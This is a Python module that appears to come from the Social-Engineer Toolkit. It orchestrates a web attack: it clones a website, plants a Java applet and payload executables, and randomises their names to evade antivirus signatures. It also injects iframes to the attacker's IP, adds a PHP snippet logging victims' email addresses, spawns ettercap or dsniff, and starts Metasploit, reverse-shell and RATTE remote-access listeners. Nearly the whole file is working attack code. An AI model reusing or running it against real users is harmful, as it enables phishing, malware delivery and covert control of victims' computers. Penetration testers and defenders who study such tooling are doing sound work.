#!/usr/bin/env python
import os
import sys
import re
import socket
import subprocess
from src.core.setcore import *
#python 3 compatibility
try: import thread
except ImportError: import _thread as thread
import shutil
import re
import threading
import socket
import datetime

# see if we are tracking emails
track_email = check_config("TRACK_EMAIL_ADDRESSES=").lower()

# grab the randomized applet name
applet_name = check_options("APPLET_NAME=")
if applet_name == "":
    applet_name = generate_random_string(6, 15) + ".jar"
    update_options("APPLET_NAME=" + applet_name)

# define if we are using a custom payload
custom = 0
if check_options("CUSTOM_EXE="):
    custom = 1
    if not "CMD/MULTI" in check_options("CUSTOM_EXE="):
        # here we need to modify the java applet to recognize custom attribute
        fileopen3 = fileopen = open("%s/web_clone/index.html" % (userconfigpath), "r")
        filewrite = open("%s/web_clone/index.html.new" % (userconfigpath), "w")
        data = fileopen3.read()

        # we randomize param name so static sigs cant be used
        goat_random = generate_random_string(4, 4)
        data = data.replace('param name="8" value="YES"', 'param name="8" value="%s"' % (goat_random))
        filewrite.write(data)
        filewrite.close()
        subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), shell=True).wait()

    print_status("Note that since you are using a custom payload, you will need to create your OWN listener.")
    print_status("SET has no idea what type of payload you are using, so you will need to set this up manually.")
    print_status("If using a custom Metasploit payload, setup a multi/handler, etc. to capture the connection back.")


# set current path
definepath = os.getcwd()

# check os
operating_system = check_os()

# set default value for automatic listener
automatic_listener = ""

if operating_system == "posix":
    try:
        import pexpect
    except ImportError:
        print_error(
            "python-pexpect is not installed.. some things may not work.")
        return_continue()

# specify base msf_path
msf_path = ""

# see if we are using setshell
set_payload = ""
if os.path.isfile(userconfigpath + "set.payload"):
    fileopen = open(userconfigpath + "set.payload", "r")
    for line in fileopen:
        set_payload = line.rstrip()

##########################################################################
#
# Start of the SET Web Server for multiattack, java applet, etc.
#
##########################################################################
def web_server_start():
    # define if use apache or not
    apache = 0
    # open set_config here
    apache_check = check_config("APACHE_SERVER=").lower()
    if apache_check == "on" or track_email == "on":
        apache_path = check_config("APACHE_DIRECTORY=")
        if os.path.isdir(apache_path + "/html"):
            apache_path = apache_path + "/html"
        apache = 1
        if operating_system == "windows":
            apache = 0

    # specify the web port
    web_port = check_config("WEB_PORT=")

    # see if exploit requires webdav
    if os.path.isfile(userconfigpath + "meta_config"):
        fileopen = open(userconfigpath + "meta_config", "r")
        for line in fileopen:
            line = line.rstrip()
            match = re.search("set SRVPORT 80", line)
            if match:
                match2 = re.search("set SRVPORT 8080", line)
                if not match2:
                    web_port = 8080

    # check ip address
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = input("Enter your ipaddress: ")

    # Grab custom or set defined
    if os.path.isfile(userconfigpath + "site.template"):
        fileopen = open(userconfigpath + "site.template", "r").readlines()
        for line in fileopen:
            line = line.rstrip()
            match = re.search("TEMPLATE=", line)
            if match:
                line = line.split("=")
                template = line[1]

    # grab web attack selection
    if os.path.isfile(userconfigpath + "attack_vector"):
        fileopen = open(userconfigpath + "attack_vector", "r").readlines()
        for line in fileopen:
            attack_vector = line.rstrip()

    # if it doesn't exist just set a default template
    if not os.path.isfile(userconfigpath + "attack_vector"):
        attack_vector = "nada"

    # Sticking it to A/V below
    import string
    import random

    def random_string(minlength=6, maxlength=15):
        length = random.randint(minlength, maxlength)
        letters = string.ascii_letters + string.digits
        return ''.join([random.choice(letters) for _ in range(length)])
    rand_gen = random_string()

    # check multiattack flags here
    multiattack_harv = "off"
    if os.path.isfile(userconfigpath + "multi_harvester"):
        multiattack_harv = "on"
    if os.path.isfile(userconfigpath + "multi_tabnabbing"):
        multiattack_harv = "on"

    # open our config file that was specified in SET
    if os.path.isfile(userconfigpath + "site.template"):
        fileopen = open(userconfigpath + "site.template", "r").readlines()
        # start loop here
        for line in fileopen:
            line = line.rstrip()
            # look for config file and parse for URL
            match = re.search("URL=", line)
            if match:
                line = line.split("=")
                # define url to clone here
                url = line[1].rstrip()

    # if we didn't create template then do self
    if not os.path.isfile(userconfigpath + "site.template"):
        template = "SELF"

    # If SET is setting up the website for you, get the website ready for
    # delivery
    if template == "SET":

        # change to that directory
        os.chdir("src/html/")
        # remove stale index.html files
        if os.path.isfile("index.html"):
            os.remove("index.html")
        # define files and get ipaddress set in index.html
        fileopen = open("index.template", "r").readlines()
        filewrite = open("index.html", "w")
        if attack_vector == "java":
            for line in fileopen:
                match1 = re.search("msf.exe", line)
                if match1:
                    line = line.replace("msf.exe", rand_gen)
                match = re.search("ipaddrhere", line)
                if match:
                    line = line.replace("ipaddrhere", ipaddr)
                filewrite.write(line)
            # move random generated name
            filewrite.close()
            shutil.copyfile("msf.exe", rand_gen)

        # define browser attack vector here
        if attack_vector == "browser":
            counter = 0
            for line in fileopen:
                counter = 0
                match = re.search(applet_name, line)
                if match:
                    line = line.replace(applet_name, "invalid.jar")
                    filewrite.write(line)
                    counter = 1
                match2 = re.search("<head>", line)
                if match2:
                    if web_port != 8080:
                        line = line.replace(
                            "<head>", '<head><iframe src ="http://%s:8080/" width="100" height="100" scrolling="no"></iframe>' % (ipaddr))
                        filewrite.write(line)
                        counter = 1
                    if web_port == 8080:
                        line = line.replace(
                            "<head>", '<head><iframe src = "http://%s:80/" width="100" height="100" scrolling="no" ></iframe>' % (ipaddr))
                        filewrite.write(line)
                        counter = 1
                if counter == 0:
                    filewrite.write(line)
        filewrite.close()

    if template == "CUSTOM" or template == "SELF":
        # Bring our files to our directory
        if attack_vector != 'hid':
            if attack_vector != 'hijacking':
                print(bcolors.YELLOW + "[*] Moving payload into cloned website." + bcolors.ENDC)
                # copy all the files needed
                if not os.path.isfile(userconfigpath + "" + applet_name):
                    shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
                                    (definepath), "%s/%s" % (userconfigpath, applet_name))
                shutil.copyfile(userconfigpath + "%s" % (applet_name),
                                "%s/web_clone/%s" % (userconfigpath, applet_name))
                if os.path.isfile("%s/src/html/nix.bin" % (definepath)):
                    nix = check_options("NIX.BIN=")
                    shutil.copyfile("%s/src/html/nix.bin" %
                                    (definepath), "%s/web_clone/%s" % (userconfigpath, nix))
                if os.path.isfile("%s/src/html/mac.bin" % (definepath)):
                    mac = check_options("MAC.BIN=")
                    shutil.copyfile("%s/src/html/mac.bin" % (definepath),
                                    "%s/web_clone/%s" % (userconfigpath, definepath, mac))
                if os.path.isfile(userconfigpath + "msf.exe"):
                    win = check_options("MSF.EXE=")
                    shutil.copyfile(userconfigpath + "msf.exe",
                                    "%s/web_clone/%s" % (userconfigpath, win))

                # pull random name generation
                print_status("The site has been moved. SET Web Server is now listening..")
                rand_gen = check_options("MSF_EXE=")
                if rand_gen != 0:
                    if os.path.isfile(userconfigpath + "custom.exe"):
                        shutil.copyfile(userconfigpath + "msf.exe",
                                        userconfigpath + "web_clone/msf.exe")
                        print("\n[*] Website has been cloned and custom payload imported. Have someone browse your site now")
                    shutil.copyfile(userconfigpath + "web_clone/msf.exe",
                                    userconfigpath + "web_clone/%s" % (rand_gen))

    # if docbase exploit do some funky stuff to get it to work right
    if os.path.isfile(userconfigpath + "docbase.file"):
        docbase = (r"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN"
         "http://www.w3.org/TR/html4/frameset.dtd">
        <HTML>
        <HEAD>
        <TITLE></TITLE>
        </HEAD>
        <FRAMESET rows="99%%, 1%%">
        <FRAME src="site.html">
        <FRAME name=docbase noresize borders=0 scrolling=no src="http://%s:8080">
        </FRAMESET>
        </HTML>""" % (ipaddr))
        if os.path.isfile(userconfigpath + "web_clone/site.html"):
            os.remove(userconfigpath + "web_clone/site.html")
        shutil.copyfile(userconfigpath + "web_clone/index.html",
                        userconfigpath + "web_clone/site.html")
        filewrite = open(userconfigpath + "web_clone/index.html", "w")
        filewrite.write(docbase)
        filewrite.close()

    ##########################################################################
    #
    # START WEB SERVER STUFF HERE
    #
    ##########################################################################

    if apache == 0:
        if multiattack_harv == 'off':
            try:
                # specify port listener here
                import src.core.webserver as webserver
                # specify the path for the SET web directories for the applet
                # attack
                path = (userconfigpath + "web_clone/")
                try:
                    import multiprocessing
                    p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                    p.start()

                except KeyboardInterrupt:
                    p.stop()

                except Exception as e:
                    import thread
                    thread.start_new_thread(webserver.start_server, (web_port, path))


                if apache == 0:
                    pause=raw_input("Press <return> when you want to shut down the web server. It is currently listening.")

            # Handle KeyboardInterrupt
            except KeyboardInterrupt:
                exit_set()

            # Handle Exceptions
            except Exception as e:
                print(e)
                log(e)
                print(bcolors.RED + "[!] ERROR: You probably have something running on port 80 already, Apache??")
                print("[!] There was an issue, printing error: " + str(e) + bcolors.ENDC)
                print(bcolors.ENDC + "Do you want to try to stop Apache? y/n")
                stop_apache = input("Attempt to stop Apache? y/n: ")
                if stop_apache == "yes" or stop_apache == "y" or stop_apache == "":
                    subprocess.Popen("/etc/init.d/apache2 stop", shell=True).wait()
                    subprocess.Popen("/etc/init.d/nginx stop", shell=True).wait()
                    try:

                        # specify port listener here
                        import src.core.webserver as webserver
                        # specify the path for the SET web directories for the
                        # applet attack
                        path = (userconfigpath + "web_clone/")
                        p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                        p.start()

                    except Exception:
                        print(bcolors.RED + "[!] UNABLE TO STOP APACHE! Exiting..." + bcolors.ENDC)
                        sys.exit()

            # if we are custom, put a pause here to not terminate thread on web
            # server
            if template == "CUSTOM" or template == "SELF":
                custom_exe = check_options("CUSTOM_EXE=")
                if custom_exe != 0:
                    while 1:
                        # try block inside of loop, if control-c detected, then
                        # exit
                        try:
                            print_warning("Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
                            pause = input(
                                bcolors.GREEN + "\n[*] Web Server is listening. Press Control-C to exit." + bcolors.ENDC)

                        # handle keyboard interrupt
                        except KeyboardInterrupt:
                            print(bcolors.GREEN + "[*] Returning to main menu." + bcolors.ENDC)
                            try: p.stop()
                            except: pass
                            break

    if apache == 1:
        subprocess.Popen("cp %s/src/html/*.bin %s 1> /dev/null 2> /dev/null;cp %s/src/html/*.html %s 1> /dev/null 2> /dev/null;cp %s/web_clone/* %s 1> /dev/null 2> /dev/null;cp %s/msf.exe %s 1> /dev/null 2> /dev/null;cp %s/*.jar %s 1> /dev/null 2> /dev/null" %
                         (definepath, apache_path, definepath, apache_path, userconfigpath, apache_path, userconfigpath, apache_path, userconfigpath, apache_path), shell=True).wait()
        # if we are tracking users
        if track_email == "on":
            now = datetime.datetime.today()
            filewrite = open("%s/harvester_%s.txt" % (apache_path, now), "w")
            filewrite.write("")
            filewrite.close()
            subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" %
                             (apache_path, now), shell=True).wait()
            # here we specify if we are tracking users and such
            fileopen = open("%s/index.html" % (apache_path), "r")
            data = fileopen.read()
            data = data.replace(
                "<body>", """<body><?php $file = 'harvester_%s.txt'; $queryString = ''; foreach ($_GET as $key => $value) { $queryString .= $key . '=' . $value . '&';}$query_string = base64_decode($queryString);file_put_contents($file, print_r("Email address recorded: " . $query_string . "\\n", true), FILE_APPEND);?>\n/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */""" % (now))
            filewrite = open("%s/index.php" % (apache_path), "w")
            filewrite.write(data)
            filewrite.close()
            print_status("All files have been copied to %s" % (apache_path))

    ##########################################################################
    #
    # END WEB SERVER STUFF HERE
    #
    ##########################################################################

    if operating_system != "windows":
        # Grab metaspoit path
        msf_path = meta_path()
        import pexpect

# define if use apache or not
apache = 0

# open set_config here
apache_check = check_config("APACHE_SERVER=").lower()
if apache_check == "on" or track_email == "on":
    apache_path = check_config("APACHE_DIRECTORY=")
    apache = 1
    if operating_system == "windows":
        apache = 0

web_server = check_config("WEB_PORT=")

# setup multi attack options here
multiattack = "off"
if os.path.isfile(userconfigpath + "multi_tabnabbing"):
    multiattack = "on"
if os.path.isfile(userconfigpath + "multi_harvester"):
    multiattack = "on"

# Grab custom or set defined
template = ""
if os.path.isfile(userconfigpath + "site.template"):
    fileopen = open(userconfigpath + "site.template", "r").readlines()
    for line in fileopen:
        line = line.rstrip()
        match = re.search("TEMPLATE=", line)
        if match:
            line = line.split("=")
            template = line[1]

# Test to see if something is running on port 80, if so throw error
try:
    web_port = check_config("WEB_PORT=")
    web_port = int(web_port)
    ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ipaddr.connect(('127.0.0.1', web_port))
    ipaddr.settimeout(2)
    if ipaddr:
        # if apache isnt running and something is on 80, throw error
        if apache == 0:
            print_error(
                "ERROR:Something is running on port %s. Attempting to see if we can stop Apache..." % (web_port))
            # if we are running windows then flag error (probably IIS or tomcat
            # or something like that)
            if operating_system == "nt":
                exit_set()

            # if we are running posix then check to see what the process is
            # first
            if operating_system == "posix":

                    # if we detect an apache installation
                if os.path.isfile("/etc/init.d/apache2"):
                    apache_stop = input(
                        "[!] Apache may be running, do you want SET to stop the process? [y/n]: ")
                    if apache_stop.lower() == "y" or apache_stop.lower() == "yes":
                        print_status(
                            "Attempting to stop apache.. One moment..")
                        # stop apache here
                        subprocess.Popen(
                            "/etc/init.d/apache2 stop", shell=True).wait()
                        try:
                            ipaddr.connect(('localhost', web_port))
                            if ipaddr:
                                print_warning(
                                    "If you want to use Apache, edit the /etc/setoolkit/set.config")
                                print_error(
                                    "Exit whatever is listening and restart SET")
                                exit_set()

                        # if it couldn't connect to localhost, we are good to
                        # go and continue forward
                        except Exception:
                            print_status(
                                "Success! Apache was stopped. Moving forward within SET...")
                    # if we don't want to stop apache then exit SET and flag
                    # user
                    if apache_stop.lower() == "n" or apache_stop.lower() == "no":
                        print_warning(
                            "If you want to use Apache, edit the /etc/setoolkit/set.config and turn apache on")
                        print_error(
                            "Exit whatever is lsitening or turn Apache on in set_config and restart SET")
                        exit_set()
                else:
                    print_warning(
                        "If you want to use Apache, edit the /etc/setoolkit/set.config")
                    print_error("Exit whatever is listening and restart SET")
                    exit_set()

        # if apache is set to run let the user know we are good to go
        if operating_system == "posix":
            if apache == 1:
                try:
                    web_port = check_config("WEB_PORT=")
                    web_port = int(web_port)
                    ipaddr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ipaddr.connect(('127.0.0.1', web_port))
                    ipaddr.settimeout(2)
                    if ipaddr:
                        print_status(
                            "Apache appears to be running, moving files into Apache's home")

                except:
                    print_error("Exit whatever is listening and restart SET")
                    exit_set()

# except all issues and throw out to here
except Exception as e:

    # if we are using apache
    if apache == 1:
        print_error("Error:Apache does not appear to be running.")
        print_error("Start it or turn APACHE off in /etc/setoolkit/set.config")
        print_status("Attempting to start Apache manually...")
        apache_counter = 0

        if os.path.isfile("/etc/init.d/apache2"):
            subprocess.Popen("/etc/init.d/apache2 start", shell=True).wait()
            apache_counter = 1

        if os.path.isfile("/etc/init.d/httpd"):
            subprocess.Popen("/etc/init.d/httpd start", shell=True).wait()
            apache_counter = 1

        if apache_counter == 0:
            print_error("ERROR: Unable to start Apache through SET,")
            print_error(
                "ERROR: Please turn Apache off in the set_config or turn it on manually!")
            print_error("Exiting the Social-Engineer Toolkit...")
            exit_set()

# except KeyboardInterrupt
except KeyboardInterrupt:
    print_warning("KeyboardInterrupt detected, bombing out to the prior menu.")

# grab metasploit root directory
if operating_system == "posix":
    msf_path = meta_path()

# Launch SET web attack and MSF Listener
try:
    if multiattack == "off":
        print((bcolors.BLUE + "\n***************************************************"))
        print((bcolors.YELLOW + "Web Server Launched. Welcome to the SET Web Attack."))
        print((bcolors.BLUE + "***************************************************"))
        print((bcolors.PURPLE +
               "\n[--] Tested on Windows, Linux, and OSX [--]" + bcolors.ENDC))
        if apache == 1:
            print((
                bcolors.GREEN + "[--] Apache web server is currently in use for performance. [--]" + bcolors.ENDC))

    if os.path.isfile(userconfigpath + "meta_config"):
        fileopen = open(userconfigpath + "meta_config", "r")
        for line in fileopen:
            line = line.rstrip()
            match = re.search("set SRVPORT 80", line)
            if match:
                match2 = re.search("set SRVPORT 8080", line)
                if not match2:
                    if apache == 1:
                        print_warning("Apache appears to be configured in the SET (set_config)")
                        print_warning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                        exit_set()
                    print(bcolors.RED + """Since the exploit picked requires port 80 for WebDav, the\nSET HTTP Server port has been changed to 8080. You will need\nto coax someone to your IP Address on 8080, for example\nyou need it to be http://172.16.32.50:8080 instead of standard\nhttp (80) traffic.""")

    web_server_start()
    # if we are using ettercap
    if os.path.isfile(userconfigpath + "ettercap"):
        fileopen5 = open(userconfigpath + "ettercap", "r")
        for line in fileopen5:
            ettercap = line.rstrip()
            # run in background
            ettercap = ettercap + " &"
            # spawn ettercap or dsniff
            subprocess.Popen(ettercap, shell=True,
                             stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    # if metasploit config is in directory
    if os.path.isfile(userconfigpath + "meta_config"):
      if ("CUSTOM" not in template) and ("SELF" not in template):
        print_info("Launching MSF Listener...")
        print_info("This may take a few to load MSF...")
        # this checks to see if we want to start a listener
        automatic_listener = check_config("AUTOMATIC_LISTENER=").lower()
        if automatic_listener != "off":
            try:
                module_reload(pexpect)
            except:
                import pexpect
            # specify if we are using the multi pyinjector
            meta_config = "meta_config"
            if os.path.isfile(userconfigpath + "meta_config_multipyinjector"):
                meta_config = "meta_config_multipyinjector"
            # if we arent using a custom payload
            if custom != 1:
                child1 = pexpect.spawn("%smsfconsole -r %s/%s\r\n\r\n" % (msf_path, userconfigpath, meta_config))
            # check if we want to deliver emails or track users that click the
            # link
            webattack_email = check_config("WEBATTACK_EMAIL=").lower()
            if webattack_email == "on" or track_email == "on":
                try:
                    module_reload(src.phishing.smtp.client.smtp_web)
                except:
                    import src.phishing.smtp.client.smtp_web

        # if we arent using a custom payload
        if custom != 1:
            child1.interact()

    if os.path.isfile(userconfigpath + "set.payload"):
        port = check_options("PORT=")

        # grab configuration
        fileopen = open(userconfigpath + "set.payload", "r")
        for line in fileopen:
            set_payload = line.rstrip()

        if set_payload == "SETSHELL":
            print("\n")
            print_info("Launching the SET Interactive Shell...")
            try:
                module_reload(src.payloads.set_payloads.listener)
            except:
                import src.payloads.set_payloads.listener
        if set_payload == "SETSHELL_HTTP":
            print("\n")
            print_info("Launching the SET HTTP Reverse Shell Listener...")
            try:
                module_reload(src.payloads.set_payloads.set_http_server)
            except:
                import src.payloads.set_payloads.set_http_server

        if set_payload == "RATTE":
            print_info(
                "Launching the Remote Administration Tool Tommy Edition (RATTE) Payload...")

            # prep ratte if its posix
            if operating_system == "posix":
                subprocess.Popen("chmod +x src/payloads/ratte/ratteserver",
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                os.system("src/payloads/ratte/ratteserver %s" % (port))

            # if not then run it in windows
            if operating_system == "windows":
                if not os.path.isfile(userconfigpath + "ratteserver.exe"):
                    shutil.copyfile(
                        "../../payloads/ratte/ratteserver.binary", userconfigpath + "ratteserver.exe")
                    shutil.copyfile(
                        "../../payloads/ratte/cygwin1.dll", userconfigpath + "cygwin1.dll")
                    os.system(userconfigpath + "ratteserver %s" % (definepath, port))

# handle errors
except Exception as e:
    log(e)
    pass
    try:
        if apache == 1:
            input(bcolors.ENDC + "\nPress [return] when finished.")
        child.close()
        child1.close()
        # close ettercap thread, need to launch from here eventually instead of executing
        # an underlying system command.
        if operating_system == "posix":
            subprocess.Popen(
                "pkill ettercap 1> /dev/null 2> /dev/null", shell=True).wait()
            # kill dnsspoof if there
            subprocess.Popen(
                "pkill dnsspoof 1> /dev/null 2> /dev/null", shell=True).wait()
            if apache == 1:
                subprocess.Popen("rm %s/index.html 1> /dev/null 2> /dev/null;rm %s/Signed* 1> /dev/null 2> /dev/null;rm %s/*.exe 1> /dev/null 2> /dev/null" %
                                 (apache_path, apache_path, apache_path), shell=True).wait()
    except:
        try:
            child.close()
        except:
            pass

except KeyboardInterrupt:
    sys.exit(1)


# if we turned automatic listener off
if automatic_listener == "off" or multiattack == "on":

    if automatic_listener == "off":
        print_warning("Listener is turned off in /etc/setoolkit/set.config!")
    if automatic_listener == "off" or template == "CUSTOM" or template == "SELF":

        while 1:
            try:
                print_warning(
                    "\n If you used custom imports, ensure you create YOUR OWN LISTENER!\nSET does not know what custom payload you used.")
                pause = input(
                    "\nPress {control -c} to return to the main menu when you are finished.")
            except KeyboardInterrupt:
                break

if apache == 1:
    # if we are running apache then prompt to exit this menu
    print_status(
        "Everything has been moved over to Apache and is ready to go.")
    return_continue()

# we stop the python web server when we are all finished
if apache == 0:
    # specify the web port
    web_port = check_config("WEB_PORT=")
    # stop the web server
    try:
        import src.core.webserver as webserver
    except:
        module_reload(src.core.webserver)
    webserver.stop_server(web_port)

# call the cleanup routine
cleanup = check_config("CLEANUP_ENABLED_DEBUG=")
if cleanup.lower() != "on":
    cleanup_routine()
